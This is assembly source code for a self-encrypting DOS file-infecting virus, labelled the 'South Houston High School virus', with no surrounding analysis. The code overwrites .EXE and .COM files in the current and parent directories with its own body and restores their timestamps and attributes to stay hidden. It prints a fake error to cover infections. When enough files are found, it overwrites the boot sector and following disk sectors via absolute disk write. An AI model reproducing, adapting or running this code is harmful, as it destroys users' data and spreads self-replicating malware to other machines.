; Source code to South Houston High School virus ;

codeseg		segment
		assume	cs:codeseg, ds:codeseg
		org	100h

cr		equ	13
lf		equ	10
tab		equ	9

start:
                call    encrypt_decrypt
                jmp     random_mutation
encrypt_val     db      0
  
infect_file:
                mov     bx,handle                       ; (648C:01F2=0)
                push    bx                              ; Save handle
                call    encrypt_decrypt                 ; encrypt code
                pop     bx                              ; Restore handle
                mov     cx,offset eof-offset start      ; Length of code
                mov     dx,offset start                 ; Start of code
                mov     ah,40h                          ; Write to handle BX
		int	21h				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
                call    encrypt_decrypt                 ; decrypt code
		mov	al,encrypt_val			; AL= code #
		add	al,13				; add 13
		adc	al,0				; plus carry
		mov	encrypt_val,al			; save new value
                ret                                     ; Return


encrypt_decrypt:
                mov     bx,offset encrypted             ; offset of encrypted
                                                        ; code in memory
                mov     al,encrypt_val                  ; encryption value
		or	al,al				; 0 ?
		jz	skipcryptor			; Don't waste time
xor_loop:       xor     byte ptr [bx],al                ; modify byte
                inc     bx                              ; next byte, please
		add	al,bh				; adjust encryption key
                cmp     bx,offset eof                   ; are we done yet?
                jle     xor_loop                        ; Nope, keep goin'
skipcryptor:    ret                                     ; Yep, bye bye!



; The code from here on is encrypted until run-time (except in the case of a
; first-run copy).


encrypted:

  
exe_filespec    db      '*.EXE',0
com_filespec    db      '*.COM',0
newdir          db      '..',0
fake_msg        db      'Program too big to fit in memory',cr,lf,'$'
virus_msg       db      cr,lf,tab,'I',39,'m sorry, Dave... but '
                db      'I',39,'m afraid I can',39,'t do that!',cr,lf,cr,lf
                db      cr,lf,tab,'Dedicated to the dudes at SHHS'
                db      cr,lf,tab,'The BOOT SECTOR Infector ...',cr,lf,'$'

random_mutation:  mov	si,offset fname			; point to fname
		mov	di,offset tfname		; point to tfname
		mov	cx,13				; 13 chars
		rep	movsb				; copy the string

		cmp     byte ptr encrypt_val,0          ; encryption value
                je      install_val                     ; Jump if equal
                mov     ah,2Ch                          ; Get time
                int     21h                             ;  Call DOS to ^
                cmp     dh,55                           ; more than 55 seconds?
                jg      find_extension                  ; Yes: don't mutate

install_val:    or      dl,dl                           ; DL = 0 ?
                jnz     skipmutation                    ; No need to mutate
skipmutation:   mov     encrypt_val,dl                  ; save code number

find_extension: mov     byte ptr files_found,0          ; Haven't found any yet
                mov     byte ptr files_infected,3       ; No more than 3 files
                mov     byte ptr success,0              ; No successful tries

find_exe:       mov     cx,27h                          ; attr: R/O,HID,SYS,ARC
                mov     dx,offset exe_filespec          ; point to '*.EXE',0
                mov     ah,4Eh                          ; Find first
                int     21h                             ; DOS Services

                jc      find_com                        ; No more?  Find EXE
                call    find_healthy                    ; Find a healthy file

find_com:       mov     cx,27h                          ; attr: R/O,HID,SYS,ARC
                mov     dx,offset com_filespec          ; point to '*.COM',0
                mov     ah,4Eh                          ; Find first match
		int	21h				; DOS Services  ah=function 4Eh
							;  find 1st filenam match @ds:dx
                jc      chdir                           ; No more?  CD ..
                call    find_healthy                    ; Start over

chdir:          mov     dx,offset newdir                ; point to '..',0
                mov     ah,3Bh                          ; CHDIR ..
                int     21h                             ; DOS Services
                jnc     find_exe                        ; Look for EXEs
                jmp     exit_virus                       ;
  
find_healthy:   mov     bx,80h                          ; points at DTA
                mov     ax,[bx+15h]                     ; original attribute
                mov     orig_attr,ax                    ; ^
                mov     ax,[bx+16h]                     ; original time stamp
                mov     orig_time,ax                    ; ^
                mov     ax,[bx+18h]                     ; original date stamp
                mov     orig_date,ax                    ; ^
                mov     dx,9Eh                          ; filename
                xor     cx,cx                           ; zero out attributes
                mov     ax,4301h                        ; set attribute
                int     21h                             ; DOS Services

                mov     ax,3D02h                        ; Open file read&write
                int     21h                             ; DOS Services
                mov     handle,ax                       ; save file handle
                mov     bx,ax                           ; place ^ in BX
                mov     cx,20                           ; read in 20 chars
                mov     dx,offset compare_buff          ; Points to buffer
                mov     ah,3Fh                          ; Read file
                int     21h                             ; DOS Services

                mov     bx,offset compare_buff          ; Points to buffer
                mov     ah,encrypt_val                  ; Encryption value
                mov     [bx+offset encrypt_val-100h],ah ; Fill in the blank
                mov     si,100h                         ; Point to code's start
                mov     di,offset compare_buff          ; Point to buffer

                repe    cmpsb                           ; Compare buff to code
                jne     healthy                         ; Didn't match, jump...

                call    close_file                      ; Close the file
                inc     byte ptr files_found            ; Found one!
continue_search:  mov   ah,4Fh                          ; Find next
                int     21h                             ; DOS Services
                jnc     find_healthy                    ; Find more
no_more_found:  ret                                     ; RETurn

healthy:        mov     bx,handle                       ; (648C:01F2=0)
                mov     ah,3Eh                          ; Close file
                int     21h                             ; DOS Services

                mov     ax,3D02h                        ; Open file read&write
                mov     dx,9Eh                          ; Filename is ....
                int     21h                             ; DOS Services

		mov	si,dx				; Point to filename
		mov	di,offset fname			; Point to fname
		mov	cx,13				; Copy 13 chars
		rep	movsb				; Copy filename

                mov     handle,ax                       ; save handle
                call    infect_file                     ; infect file
                call    close_file                      ; close file
                inc     byte ptr success                ; Success!!!
                dec     byte ptr files_infected         ; We got one!
                jz      exit_virus                      ; Jump if zero
                jmp     short continue_search           ; Continue the search

close_file:     mov     bx,handle                       ; get handle
                mov     cx,orig_time                    ; get original time
                mov     dx,orig_date                    ; get original date

                mov     ax,5701h                        ; set date/time stamp
                int     21h                             ; DOS Services

                mov     ah,3Eh                          ; close file
                int     21h                             ; DOS Services

                mov     cx,orig_attr                    ; get original attrib
                mov     ax,4301h                        ; get/set attribute
                mov     dx,9Eh                          ; point to filename
                int     21h                             ; DOS Services
                ret                                     ; RETurn

exit_virus:     cmp     byte ptr files_found,8          ; Found at least 8?
                jl      print_fake                      ; No, keep low profile
                cmp     byte ptr success,0              ; Got anything?
                jg      print_fake                      ; Yep, cover it up

                mov     ah,9                            ; Print string
                mov     dx,offset virus_msg             ; Point to virus msg
                int     21h                             ; DOS Services

		mov	ah,19h				; Get current disk
		int	21h				; Call DOS to ^

		mov	si,offset tfname		; Point to tfname
		mov	di,offset fname			; Point to fname
		mov	cx,13				; Copy 13 chars
		rep	movsb				; Copy filename

                mov     bx,offset kbstr                 ; BX points to message
                xor     dx,dx                           ; Start at boot sector
		mov	cx,35				; 35 sectors
		int	26h				; Absolute disk write, drive al
                jmp     short terminate                 ; End of the line!

print_fake:     mov     ah,9                            ; Print string
                mov     dx,offset fake_msg              ; DX points to fake msg
                int     21h                             ; DOS Services

terminate:
                mov     ax,305h                         ; Set typematic rate
                mov     bx,31Fh                         ; Long delay, fast reps
                int     16h                             ; Keyboard i/o call ^^
                int     20h                             ; Terminate process

kbstr:		db	'Killed by: '			;Killed by
fname:		db	'1st run copy',0		;13 spaces for filename
ekbstr:		db	'$'				;Terminator for string

eof:

;These variables are for temporary use only and are therefore excluded from
;encryption and writing to the disk (this saves time and space).

compare_buff    db      20 dup (?)
files_found     db      ?
files_infected  db      ?
orig_time       dw      ?
orig_date       dw      ?
orig_attr       dw      ?
handle          dw      ?
success         db      ?

tfname:		db	13 dup (?)

codeseg         ends
  
  
  
		end	start
